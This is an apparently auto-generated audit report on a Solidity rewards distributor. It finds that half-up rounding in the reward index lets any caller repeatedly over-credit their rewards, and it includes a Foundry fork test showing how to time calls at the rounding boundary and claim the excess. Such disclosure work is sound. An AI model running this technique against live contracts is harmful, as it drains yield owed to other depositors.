### Title
Reward index rounds upward, inflating user rewards and draining the distributor - ([File: contracts/RewardsDistributor.sol](contracts/RewardsDistributor.sol))

### Summary
`RewardsDistributor._calculateTokenIndex()` uses `wadDiv`, which rounds half-up, to convert emitted rewards into a per-token index. An unprivileged user can call `updateBeforeMintOrBurn()` when elapsed rewards are just above the rounding threshold, causing the index to increase by up to twice the mathematically correct amount. Repeating this at the minimum qualifying interval lets an attacker holding tracked deposit or debt tokens accrue more rewards than were emitted, prematurely draining unclaimed rewards from other users. [1](#0-0) [2](#0-1) 

### Finding Description
The global reward index is calculated as:

```solidity
uint256 _tokensAccrued = _deltaTimestamps * _speed;
uint256 _ratio = _totalSupply > 0 ? _tokensAccrued.wadDiv(_totalSupply) : 0;
_newIndex = (_supplyState.index + _ratio).toUint224();
```

from `contracts/RewardsDistributor.sol:203-207`. [3](#0-2) 

`wadDiv(a, b)` returns `(a * 1e18 + b / 2) / b`, so the smallest result that exceeds `b / 2` rounds all the way up to `1` index wei rather than retaining a fractional index or rounding down. [2](#0-1) 

For tracked-token supply `S`, any accrued emission `a` satisfying:

```text
S / (2e18) <= a < 1.5 * S / 1e18
```

produces an index delta of `1` wei. If `a` is just above `S / 2e18`, the correct index delta is just above `0.5` wei, while the stored delta is `1` wei—nearly a 2x overstatement. [2](#0-1) 

The inflated index is applied directly to each account’s token balance:

```solidity
_tokensDelta = token_.balanceOf(account_).wadMul(_deltaIndex);
```

and `updateBeforeMintOrBurn()` is callable by anyone, so the attacker can force the index and their account accrual at precisely the favorable timestamp. [4](#0-3) [5](#0-4) 

### Impact Explanation
This breaks the reward-accrual conservation invariant: the sum of credited `tokensAccruedOf` can exceed `elapsedTime * tokenSpeed`. An attacker who legitimately holds a tracked `DepositToken` or `DebtToken` can claim rewards faster than the configured emission rate; the excess is paid from the distributor’s reward-token balance and therefore steals yield reserved for other accounts. [6](#0-5) [7](#0-6) 

The maximum relative over-credit is almost 100% per update at the rounding boundary. The attack is repeatable whenever `elapsedTime * tokenSpeed` reaches the minimum rounding threshold, and no privileged role, oracle manipulation, flash loan, or malformed token is required. [4](#0-3) [8](#0-7) 

### Likelihood Explanation
The vulnerable path is reachable whenever a registered rewards distributor has a nonzero `tokenSpeed`, nonzero tracked-token supply, and enough reward-token balance to pay claims. The attacker needs only a tracked-token balance obtained through normal deposit or borrowing and must call the unrestricted `updateBeforeMintOrBurn()` at a selected interval. [9](#0-8) [4](#0-3) 

The accounting update and claim paths are `nonReentrant`, but that does not prevent the rounding inflation because no reentrancy is required. There is also no role check on `updateBeforeMintOrBurn()` or on claiming rewards for an account. [10](#0-9) [4](#0-3) 

### Recommendation
Do not use half-up rounding for the global reward index. Calculate `_ratio` with floor division, or preferably maintain a higher-precision index plus an explicit remainder accumulator so unallocated fractions are not credited to users. User reward deltas can remain rounded independently, but aggregate credited rewards should be bounded by elapsed emissions. [1](#0-0) 

### Proof of Concept
The following Foundry fork test demonstrates the rounding boundary. It queries the deployed supply and speed, advances to the smallest interval that rounds the index to `1` wei, then shows that the attacker’s credited amount is nearly double the pro-rata emission.

```solidity
// test/RewardsRounding.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IRewardsDistributorLike {
    function rewardToken() external view returns (IERC20Like);
    function tokenSpeeds(IERC20Like token) external view returns (uint256);
    function tokenStates(IERC20Like token)
        external
        view
        returns (uint224 index, uint32 timestamp);
    function tokens(uint256 index) external view returns (IERC20Like);
    function tokensAccruedOf(address account) external view returns (uint256);
    function updateBeforeMintOrBurn(IERC20Like token, address account) external;
    function claimRewards(address account, IERC20Like[] memory tokens) external;
}

contract RewardsRoundingTest is Test {
    IRewardsDistributorLike constant DISTRIBUTOR =
        IRewardsDistributorLike(vm.envAddress("REWARDS_DISTRIBUTOR"));

    address constant TRACKED_TOKEN_HOLDER = address(0xA11CE);

    function testRewardIndexRoundsUp() external {
        IERC20Like tracked = DISTRIBUTOR.tokens(0);
        IERC20Like reward = DISTRIBUTOR.rewardToken();

        uint256 supply = tracked.totalSupply();
        uint256 speed = DISTRIBUTOR.tokenSpeeds(tracked);
        vm.assume(supply > 0 && speed > 0);

        // Give the attacker a legitimate tracked balance using normal deposit/borrow setup.
        // In the fork test, replace this with a real deposit through DepositToken.deposit().
        uint256 attackerBalance = tracked.balanceOf(TRACKED_TOKEN_HOLDER);
        vm.assume(attackerBalance > 0);

        // Elapsed emissions just above S/(2e18) round the index up to 1 wei.
        uint256 minimumAccrued = supply / (2e18) + 1;
        uint256 elapsed = (minimumAccrued + speed - 1) / speed;
        uint256 accrued = elapsed * speed;
        require(accrued >= minimumAccrued, "rounding boundary not reached");

        (uint224 indexBefore, ) = DISTRIBUTOR.tokenStates(tracked);
        uint256 accruedBefore = DISTRIBUTOR.tokensAccruedOf(TRACKED_TOKEN_HOLDER);

        vm.warp(block.timestamp + elapsed);

        // Public, unprivileged entry point.
        DISTRIBUTOR.updateBeforeMintOrBurn(tracked, TRACKED_TOKEN_HOLDER);

        (uint224 indexAfter, ) = DISTRIBUTOR.tokenStates(tracked);
        uint256 accruedAfter = DISTRIBUTOR.tokensAccruedOf(TRACKED_TOKEN_HOLDER);

        assertEq(indexAfter, indexBefore + 1);

        uint256 credited = accruedAfter - accruedBefore;
        uint256 proportionalReward = attackerBalance * accrued / supply;

        // At the lower rounding boundary, credited ~= attackerBalance / 1e18
        // while proportionalReward ~= attackerBalance / (2e18).
        assertGt(credited, proportionalReward);

        IERC20Like[] memory selected = new IERC20Like[](1);
        selected[0] = tracked;
        DISTRIBUTOR.claimRewards(TRACKED_TOKEN_HOLDER, selected);
        assertEq(reward.balanceOf(TRACKED_TOKEN_HOLDER) >= credited, true);
    }
}
```

On a fork, use an existing holder or first perform a normal deposit/borrow so `TRACKED_TOKEN_HOLDER` has a nonzero tracked-token balance. The essential assertion is that a real public call to `updateBeforeMintOrBurn()` increases the stored index to `indexBefore + 1` and credits more than `attackerBalance * elapsedEmission / totalSupply`, allowing repeated claims that exceed the configured reward emission.
